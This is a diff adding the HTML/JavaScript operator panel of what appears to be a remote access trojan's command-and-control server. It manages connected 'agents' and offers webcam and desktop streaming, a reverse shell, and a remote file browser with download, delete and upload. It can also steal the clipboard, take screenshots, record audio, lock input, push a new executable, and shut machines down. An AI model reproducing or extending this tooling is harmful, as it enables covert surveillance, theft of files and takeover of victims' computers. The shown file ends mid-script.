@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agent Command Center</title>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <style>
+        :root {
+            --text-color: #e0e0e0;
+            --text-muted-color: #a0a0a0;
+            --border-color: rgba(255, 255, 255, 0.2);
+            --glass-bg: rgba(20, 20, 30, 0.6);
+            --glass-hover-bg: rgba(40, 40, 60, 0.7);
+            --input-bg: rgba(0, 0, 0, 0.3);
+            --primary-color: #6a82fb;
+            --green-color: #4ade80;
+            --red-color: #f87171;
+            --orange-color: #facc15;
+            --blue-color: #60a5fa;
+            --purple-color: #c084fc;
+        }
+
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            color: var(--text-color);
+            background: linear-gradient(-45deg, #01010b, #0c0c2c, #131b4b, #0b203b);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+            min-height: 100vh;
+        }
+        .container { max-width: 1300px; margin: auto; }
+        h1, h2 { border-bottom: 1px solid var(--border-color); padding-bottom: 10px; font-weight: 500; }
+        h1 { color: white; } h2 { color: var(--text-muted-color); }
+        
+        .glass-card {
+            background: var(--glass-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
+        }
+
+        .controls-grid { display: grid; grid-template-columns: 1fr auto; gap: 10px; margin-bottom: 20px; }
+        .controls-grid input, .controls-grid select {
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 1rem;
+            background-color: var(--input-bg);
+            color: var(--text-color);
+        }
+        .controls-grid input:focus, .controls-grid select:focus { outline: 2px solid var(--primary-color); border-color: transparent; }
+
+        .button-group { display: flex; gap: 10px; flex-wrap: wrap; }
+        .button-group button, .modal-toolbar button {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 10px 15px;
+            border: 1px solid transparent;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.9rem;
+            font-weight: 500;
+            transition: all 0.2s ease;
+            color: var(--text-color);
+        }
+        .button-group button:hover, .modal-toolbar button:hover { transform: translateY(-2px); box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+        .button-group button:disabled { background-color: rgba(85,85,85,0.5); cursor: not-allowed; transform: none; box-shadow: none; }
+
+        #send-button { background-color: var(--primary-color); }
+        #start-shell-btn { background-color: var(--orange-color); }
+        #file-browser-btn { background-color: var(--blue-color); }
+        #system-controls-btn { background-color: var(--purple-color); }
+        .stream-btn { background-color: var(--green-color); }
+        #stop-stream-btn { background-color: var(--red-color); }
+        
+        .button-group button svg { width: 18px; height: 18px; }
+
+        #video-container { display: none; } #video-display { width: 100%; border-radius: 8px; background-color: #000; }
+        #agent-cards-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
+        
+        .agent-card {
+            background: var(--glass-bg);
+            border: 1px solid var(--border-color);
+            border-left: 5px solid var(--primary-color);
+            padding: 15px;
+            border-radius: 8px;
+            transition: all 0.2s ease;
+        }
+        .agent-card:hover { transform: translateY(-3px); border-color: var(--primary-color); }
+        .agent-card.status-online { border-left-color: var(--green-color); }
+        .agent-card.status-shell-active { border-left-color: var(--orange-color); }
+        .agent-card.status-input-locked { border-left-color: var(--red-color); }
+        
+        .stats-grid { display: grid; grid-template-columns: auto 1fr; gap: 8px 15px; font-size: 0.9rem; align-items: center; }
+        .stats-grid > dt { color: var(--text-muted-color); }
+        /* NEW: Styles for dd to align text and bar */
+        .stats-grid > dd { font-weight: 500; text-align: right; display: flex; align-items: center; justify-content: flex-end; gap: 10px; }
+        .stats-grid > dd.full-width { grid-column: 2; }
+        .stats-grid > dd > span { flex-shrink: 0; width: 45px; text-align: left; }
+        
+        .progress-bar { background-color: rgba(0,0,0,0.3); border-radius: 5px; height: 10px; overflow: hidden; flex-grow: 1; }
+        .progress-bar-inner { background-color: var(--primary-color); height: 100%; text-align: center; font-size: 0.8rem; color: white; transition: width 0.5s; }
+        
+        #responses { max-height: 200px; overflow-y: auto; background-color: var(--input-bg); padding: 10px; border-radius: 8px; font-size: 0.9rem; }
+
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: none; justify-content: center; align-items: center; z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        .modal-content {
+            background: var(--glass-bg);
+            border: 1px solid var(--border-color);
+            width: 90%; max-width: 1200px; height: 85vh; display: flex; flex-direction: column;
+            border-radius: 12px; box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.3);
+        }
+        .modal-header { padding: 15px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; }
+        .modal-header h3 { margin: 0; font-size: 1.2rem; }
+        .modal-close-btn { background: transparent; border: none; cursor: pointer; color: var(--text-color); }
+        .modal-close-btn svg { width: 24px; height: 24px; }
+        
+        .modal-body { flex-grow: 1; overflow-y: auto; padding: 15px; }
+        .modal-toolbar { padding: 10px; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid var(--border-color); flex-wrap: wrap;}
+        .modal-toolbar button svg { width: 16px; height: 16px; }
+        
+        #shell-output { flex-grow: 1; overflow-y: auto; padding: 10px; background: rgba(0,0,0,0.4); font-family: 'Courier New', Courier, monospace; white-space: pre-wrap; font-size: 0.9rem; border-radius: 8px; margin: 15px;}
+        #shell-input-container { display: flex; padding: 15px; border-top: 1px solid var(--border-color); }
+        #shell-input { flex-grow: 1; background: var(--input-bg); border: 1px solid var(--border-color); color: var(--text-color); padding: 10px; font-family: 'Courier New', Courier, monospace; border-radius: 8px; }
+
+        .data-table { width: 100%; border-collapse: collapse; }
+        .data-table th, .data-table td { text-align: left; padding: 12px; border-bottom: 1px solid var(--border-color); }
+        .data-table tr:last-child td { border-bottom: none; }
+        .data-table .action-btn { background: transparent; border: none; color: var(--text-muted-color); cursor: pointer; padding: 5px; transition: color 0.2s; }
+        .data-table .action-btn:hover { color: var(--text-color); }
+        .data-table .action-btn svg { width: 18px; height: 18px; }
+
+        #fb-path { flex-grow: 1; padding: 8px; background-color: var(--input-bg); border: 1px solid var(--border-color); border-radius: 4px; color: var(--text-color); }
+        #fb-content .fb-item { cursor: pointer; }
+        #fb-content tr:hover { background-color: var(--glass-hover-bg); }
+        .fb-item span { vertical-align: middle; margin-right: 8px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Agent Command Center</h1>
+        <div class="glass-card">
+            <h2>Controls</h2>
+            <div class="controls-grid">
+                <input type="text" id="command-input" placeholder="Enter text command for selected agent(s)">
+                <select id="agent-selector"></select>
+            </div>
+            <div class="button-group">
+                <button type="button" id="start-webcam-btn" class="stream-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z"></path><circle cx="12" cy="13" r="3"></circle></svg>Webcam</button>
+                <button type="button" id="start-desktop-btn" class="stream-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="20" height="14" x="2" y="3" rx="2"></rect><line x1="8" x2="16" y1="21" y2="21"></line><line x1="12" x2="12" y1="17" y2="21"></line></svg>Desktop</button>
+                <button type="button" id="stop-stream-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect></svg>Stop Stream</button>
+                <button type="button" id="start-shell-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 17.25V14a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v3.25"></path><path d="M12 12V3"></path><path d="m6 6 6-6 6 6"></path></svg>Shell</button>
+                <button type="button" id="file-browser-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"></path></svg>Files</button>
+                <button type="button" id="system-controls-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 0 2l-.15.08a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l-.22-.38a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1 0-2l.15-.08a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"></path><circle cx="12" cy="12" r="3"></circle></svg>System</button>
+            </div>
+        </div>
+
+        <div id="video-container" class="glass-card"><img id="video-display" src="" alt="Video stream"></div>
+        <div class="glass-card"><h2>Connected Agents</h2><div id="agent-cards-container"><p>Waiting for agents to connect...</p></div></div>
+        <div class="glass-card"><h2>Agent Responses</h2><div id="responses"></div></div>
+    </div>
+
+    <!-- Modals -->
+    <div id="shell-modal" class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3 id="shell-title">Reverse Shell</h3><button type="button" id="shell-close-btn" class="modal-close-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button></div><div id="shell-output"></div><div id="shell-input-container"><span style="padding: 10px;">></span><input type="text" id="shell-input" autocomplete="off" placeholder="Enter command..."></div></div></div>
+    
+    <div id="fb-modal" class="modal-overlay"><div class="modal-content"><div class="modal-header"><h3 id="fb-title">File Browser</h3><button type="button" id="fb-close-btn" class="modal-close-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button></div><div class="modal-toolbar"><button type="button" id="fb-up-btn" title="Go up one level"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m18 15-6-6-6 6"></path></svg></button><input type="text" id="fb-path"><button type="button" id="fb-upload-btn" title="Upload to current folder"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg> Upload</button><input type="file" id="fb-upload-input" style="display:none;"></div><div id="fb-content" class="modal-body"></div></div></div>
+
+    <div id="system-modal" class="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header"><h3 id="system-title">System Controls</h3><button type="button" id="system-close-btn" class="modal-close-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button></div>
+            <div class="modal-toolbar">
+                <button type="button" id="sys-refresh-procs-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8"></path><path d="M21 3v5h-5"></path><path d="M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16"></path><path d="M3 21v-5h5"></path></svg>Processes</button>
+                <button type="button" id="sys-get-clipboard-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="8" height="4" x="8" y="2" rx="1" ry="1"></rect><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path></svg>Clipboard</button>
+                <button type="button" id="sys-lock-input-btn"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>Lock Input</button>
+                <button type="button" id="sys-screenshot-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>Screenshot</button>
+                <button type="button" id="sys-record-audio-btn"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3Z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="22"></line></svg>Record Audio</button>
+                <button type="button" id="sys-restart-script-btn" style="color: var(--blue-color);"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 2v4"></path><path d="M14 2v4"></path><path d="M10 20v-4"></path><path d="M14 20v-4"></path><path d="M4 14H2"></path><path d="M4 10H2"></path><path d="M20 14H22"></path><path d="M20 10H22"></path><path d="M14 4h-4"></path><path d="M14 20h-4"></path><path d="M4 14v-4"></path><path d="M20 14v-4"></path></svg>Restart Script</button>
+                <button type="button" id="sys-update-agent-btn" style="color: var(--green-color);"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg>Update Agent (EXE)</button>
+                <button type="button" id="sys-restart-btn" style="color: var(--orange-color);"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2v10"></path><path d="M18.4 7.6a9 9 0 1 1-12.79 0"></path></svg>Restart System</button>
+                <button type="button" id="sys-shutdown-btn" style="color: var(--red-color);"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"></path><line x1="12" y1="2" x2="12" y2="12"></line></svg>Shutdown</button>
+            </div>
+            <div id="process-list-container" class="modal-body"><p>Click "Processes" to begin.</p></div>
+        </div>
+    </div>
+    <input type="file" id="agent-update-input" style="display:none;" accept=".exe">
+
+<script>
+    const socket = io.connect('http://' + document.domain + ':' + location.port);
+    let currently_streaming_agent = null;
+    let shell_active_agent = null;
+    let fb_active_agent = null;
+    let system_active_agent = null;
+    const FILE_CHUNK_SIZE = 1024 * 1024; // 1MB
+
+    const agentSelector = document.getElementById('agent-selector');
+    const agentCardsContainer = document.getElementById('agent-cards-container');
+    const responsesDiv = document.getElementById('responses');
+
+    function createAgentCard(agent) {
+        const stats = agent.stats || {};
+        const card = document.createElement('div');
+        card.className = `agent-card status-${(stats.status || 'offline').toLowerCase().replace(/\s+/g, '-')}`;
+        card.id = `agent-card-${agent.id}`;
+        const p_bar = (v) => `<div class="progress-bar"><div class="progress-bar-inner" style="width: ${v||0}%; background-color: ${v > 85 ? 'var(--red-color)' : v > 60 ? 'var(--orange-color)' : 'var(--primary-color)'};"></div></div>`;
+        card.innerHTML = `
+            <div style="font-weight: bold; margin-bottom: 10px;">${agent.id}</div>
+            <dl class="stats-grid">
+                <dt>Status</dt><dd class="full-width">${stats.status||'Offline'}</dd>
+                <dt>Location</dt><dd class="full-width">${stats.location||'N/A'}</dd>
+                <dt>Uptime</dt><dd class="full-width">${stats.uptime||'N/A'}</dd>
+                <dt>Battery</dt><dd class="full-width">${stats.battery||'N/A'}</dd>
+                <dt>CPU</dt><dd><span>${(stats.cpu_usage || 0).toFixed(1)}%</span>${p_bar(stats.cpu_usage)}</dd>
+                <dt>RAM</dt><dd><span>${(stats.ram_usage || 0).toFixed(1)}%</span>${p_bar(stats.ram_usage)}</dd>
+                <dt>Disk</dt><dd><span>${(stats.disk_usage || 0).toFixed(1)}%</span>${p_bar(stats.disk_usage)}</dd>
+            </dl>`;
+        return card;
+    }
+
+    function addResponse(agent_id, response) {
+        const p = document.createElement('p');
+        p.innerHTML = `<strong>${agent_id}:</strong> ${response}`;
+        responsesDiv.prepend(p);
+    }
+
+    // --- Core Socket Listeners ---
+    socket.on('connect', () => socket.emit('request_agent_list'));
+    socket.on('update_all_agents', (agents) => {
+        const selectedAgent = agentSelector.value;
+        agentCardsContainer.innerHTML = '';
+        agentSelector.innerHTML = '<option value="all">All Agents</option>';
+        if (agents.length > 0) {
+            agents.forEach(agent => {
+                agentCardsContainer.appendChild(createAgentCard(agent));
+                const option = document.createElement('option');
+                option.value = agent.id; option.textContent = agent.id;
+                agentSelector.appendChild(option);
+            });
+        } else {
+            agentCardsContainer.innerHTML = '<p>Waiting for agents to connect...</p>';
+        }
+        const agentIds = agents.map(a => a.id);
+        agentSelector.value = agentIds.includes(selectedAgent) ? selectedAgent : 'all';
+        updateAllButtons();
+    });
+    socket.on('update_from_agent', (data) => addResponse(data.agent_id, data.response));
+
+    function updateAllButtons() {
+        const isSpecificAgent = agentSelector.value && agentSelector.value !== 'all';
+        const modalOpen = shell_active_agent || fb_active_agent || system_active_agent;
+        document.getElementById('start-webcam-btn').disabled = !isSpecificAgent || modalOpen;
+        document.getElementById('start-desktop-btn').disabled = !isSpecificAgent || modalOpen;
+        document.getElementById('start-shell-btn').disabled = !isSpecificAgent || modalOpen;
+        document.getElementById('file-browser-btn').disabled = !isSpecificAgent || modalOpen;
+        document.getElementById('system-controls-btn').disabled = !agentSelector.value || modalOpen;
+        document.getElementById('stop-stream-btn').disabled = !(currently_streaming_agent === agentSelector.value);
+    }
+    agentSelector.addEventListener('change', updateAllButtons);
+    
+    // --- Streaming & Shell ---
+    socket.on('video_frame_to_web', (data) => { if (data.agent_id === currently_streaming_agent) { document.getElementById('video-display').src = 'data:image/jpeg;base64,' + data.frame; } });
+    const startStream = (cmd) => { const t = agentSelector.value; if (t === 'all') return; currently_streaming_agent = t; socket.emit('command_from_web', { command: cmd, target: t }); document.getElementById('video-container').style.display = 'block'; updateAllButtons(); };
+    document.getElementById('start-webcam-btn').onclick = () => startStream('start_webcam');
+    document.getElementById('start-desktop-btn').onclick = () => startStream('start_desktop');
+    document.getElementById('stop-stream-btn').onclick = () => { socket.emit('command_from_web', { command: 'stop_stream', target: currently_streaming_agent }); document.getElementById('video-container').style.display = 'none'; currently_streaming_agent = null; updateAllButtons(); };
+    const shellModal = document.getElementById('shell-modal');
+    document.getElementById('start-shell-btn').onclick = () => { const t = agentSelector.value; if (t === 'all') return; shell_active_agent = t; document.getElementById('shell-title').textContent = `Reverse Shell: ${t}`; document.getElementById('shell-output').textContent = ''; shellModal.style.display = 'flex'; document.getElementById('shell-input').focus(); socket.emit('command_from_web', { command: 'start_reverse_shell', target: t }); updateAllButtons(); };
+    document.getElementById('shell-close-btn').onclick = () => { socket.emit('command_from_web', { command: 'stop_reverse_shell', target: shell_active_agent }); shellModal.style.display = 'none'; shell_active_agent = null; updateAllButtons(); };
+    document.getElementById('shell-input').addEventListener('keydown', (e) => { if (e.key === 'Enter' && shell_active_agent) { socket.emit('shell_command_from_web', { target: shell_active_agent, command: document.getElementById('shell-input').value }); document.getElementById('shell-input').value = ''; } });
+    socket.on('shell_output_to_web', (data) => { if (data.agent_id === shell_active_agent) { const o = document.getElementById('shell-output'); o.textContent += data.output + '\n'; o.scrollTop = o.scrollHeight; }});
+    socket.on('force_shell_close', (data) => { if (data.agent_id === shell_active_agent) { alert(`Shell for ${shell_active_agent} was forcibly closed.`); document.getElementById('shell-close-btn').onclick(); }});
+    
+    // --- File Browser ---
+    const fbModal = document.getElementById('fb-modal'), fbContent = document.getElementById('fb-content'), fbPathInput = document.getElementById('fb-path');
+    const sendFbCommand = (command, path = null) => { if (fb_active_agent) socket.emit('fb_command_from_web', { target: fb_active_agent, command, path }); }
+    const formatSize = (bytes) => { if (bytes === 0) return '0 B'; const i = Math.floor(Math.log(bytes) / Math.log(1024)); return `${parseFloat((bytes / Math.pow(1024, i)).toFixed(2))} ${['B','KB','MB','GB'][i]}`; };
+    
+    const renderFbContents = (path, contents) => {
+        fbPathInput.value = path;
+        if (contents.error) { fbContent.innerHTML = `<p>Error: ${contents.error}</p>`; return; }
+        contents.sort((a,b) => (b.type === 'dir') - (a.type === 'dir') || a.name.localeCompare(b.name));
+        let html = '<table class="data-table"><tr><th>Name</th><th>Size</th><th style="text-align:right;">Actions</th></tr>';
+        contents.forEach(item => {
+            const itemPath = JSON.stringify(path + (path.endsWith('\\') || path.endsWith('/') ? '' : (path.includes('\\') ? '\\' : '/')) + item.name);
+            const icon = item.type === 'dir' ? '<span><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--blue-color)"><path d="M4 20h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.93a2 2 0 0 1-1.66-.9l-.82-1.2A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13c0 1.1.9 2 2 2Z"></path></svg></span>' : '<span><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="color:var(--text-muted-color)"><path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z"></path><polyline points="14 2 14 8 20 8"></polyline></svg></span>';
+            html += `<tr>
+                <td class="fb-item" onclick='handleFbItemClick(${JSON.stringify(item.type)}, ${itemPath})'>${icon} ${item.name}</td>
+                <td>${item.type === 'file' ? formatSize(item.size) : 'Folder'}</td>
+                <td style="text-align:right;">
+                    ${item.type === 'file' ? `<button class="action-btn" onclick='downloadFile(${itemPath})' title="Download"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg></button>` : ''}
+                    <button class="action-btn" onclick='deleteItem(${itemPath})' title="Delete"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg></button>
+                </td>
+            </tr>`;
+        });
+        fbContent.innerHTML = html + '</table>';
+    };
+    window.handleFbItemClick = (type, path) => { if (type === 'dir') sendFbCommand('list_dir', path); }
+    window.downloadFile = (path) => { addResponse(fb_active_agent, `Starting download for ${path.split(/[\\/]/).pop()}...`); sendFbCommand('download_file', path); }
+    window.deleteItem = (path) => { if (confirm(`Delete '${path.split(/[\\/]/).pop()}'?`)) sendFbCommand('delete_item', path); }
+    fbPathInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendFbCommand('list_dir', fbPathInput.value); });
+    document.getElementById('fb-up-btn').onclick = () => { let p = fbPathInput.value; if (p.length <= 3) return; sendFbCommand('list_dir', p.substring(0, p.replace(/[\\/]$/, '').lastIndexOf(p.includes('\\') ? '\\' : '/'))); };
+    document.getElementById('file-browser-btn').onclick = () => { const t = agentSelector.value; if (t === 'all') return; fb_active_agent = t; document.getElementById('fb-title').textContent = `File Browser: ${t}`; fbContent.innerHTML = '<p>Fetching initial directory...</p>'; fbModal.style.display = 'flex'; sendFbCommand('get_initial_path'); updateAllButtons(); };
+    document.getElementById('fb-close-btn').onclick = () => { fbModal.style.display = 'none'; fb_active_agent = null; updateAllButtons(); };
+    socket.on('fb_response_to_web', (data) => { if (data.agent_id === fb_active_agent) renderFbContents(data.path, data.contents); });
+    socket.on('fb_download_ready', (data) => { addResponse(data.agent_id || 'Agent', `Download ready: ${data.filename}.`); const a = document.createElement('a'); a.href = data.url; a.download = data.filename; document.body.appendChild(a); a.click(); document.body.removeChild(a); });
+    
+    // --- FILE UPLOAD (to agent downloads) ---
+    document.getElementById('fb-upload-btn').onclick = () => document.getElementById('fb-upload-input').click();
+    document.getElementById('fb-upload-input').onchange = (e) => {
+        const file = e.target.files[0];
+        if (!file || !fb_active_agent) return;
+        const reader = new FileReader(), transfer_id = `upload_${Date.now()}`;
+        let offset = 0;
+        reader.onload = (ev) => {
+            socket.emit('file_upload_chunk_from_web', {
+                target: fb_active_agent, transfer_id, filename: file.name,
+                chunk: ev.target.result, final: (offset + ev.target.result.byteLength) >= file.size
+            });
+            offset += ev.target.result.byteLength;
+            if (offset < file.size) readNextChunk();
+        };
+        const readNextChunk = () => reader.readAsArrayBuffer(file.slice(offset, offset + FILE_CHUNK_SIZE));
+        readNextChunk();
+        e.target.value = '';
+    };
+
+    // --- System Controls ---
+    const systemModal = document.getElementById('system-modal');
+    const procListContainer = document.getElementById('process-list-container');
+    const sendSysCommand = (command, payload = {}) => { if (system_active_agent) socket.emit('system_command_from_web', { target: system_active_agent, command, ...payload }); }
+    document.getElementById('system-controls-btn').onclick = () => {
+        system_active_agent = agentSelector.value;
+        document.getElementById('system-title').textContent = `System Controls: ${system_active_agent}`;
+        procListContainer.innerHTML = '<p>Select an action.</p>';
+        document.getElementById('sys-refresh-procs-btn').disabled = (system_active_agent === 'all');
+        systemModal.style.display = 'flex';
+        updateAllButtons();
+    };
+    document.getElementById('system-close-btn').onclick = () => { systemModal.style.display = 'none'; system_active_agent = null; updateAllButtons(); };
+    document.getElementById('sys-refresh-procs-btn').onclick = () => sendSysCommand('get_processes');
+    document.getElementById('sys-get-clipboard-btn').onclick = () => sendSysCommand('get_clipboard');
+    document.getElementById('sys-lock-input-btn').onclick = () => { const d = prompt("Lock duration (s):", "30"); if (d) sendSysCommand('lock_input', { duration: d }); };
+    document.getElementById('sys-screenshot-btn').onclick = () => sendSysCommand('take_screenshot');
+    document.getElementById('sys-record-audio-btn').onclick = () => { const d = prompt("Record audio duration (s):", "10"); if (d) sendSysCommand('record_audio', { duration: d }); };
+    document.getElementById('sys-restart-script-btn').onclick = () => { if (confirm("Restart the agent script(s)/executable(s)?")) sendSysCommand('restart_script'); };
+    document.getElementById('sys-restart-btn').onclick = () => { if (confirm("RESTART the agent's entire machine?")) sendSysCommand('restart'); };
+    document.getElementById('sys-shutdown-btn').onclick = () => { if (confirm("SHUT DOWN the agent's entire machine?")) sendSysCommand('shutdown'); };
+    window.killProcess = (pid) => { if (confirm(`Kill PID: ${pid}?`)) sendSysCommand('kill_process', { pid: pid }); };
+    
+    // --- NEW: Agent Update via EXE upload ---
+    document.getElementById('sys-update-agent-btn').onclick = () => {
+        if (!system_active_agent) return;
+        if (confirm(`This will send a new .exe to update agent(s) '${system_active_agent}'. Continue?`)) {
+            document.getElementById('agent-update-input').click();
+        }
+    };
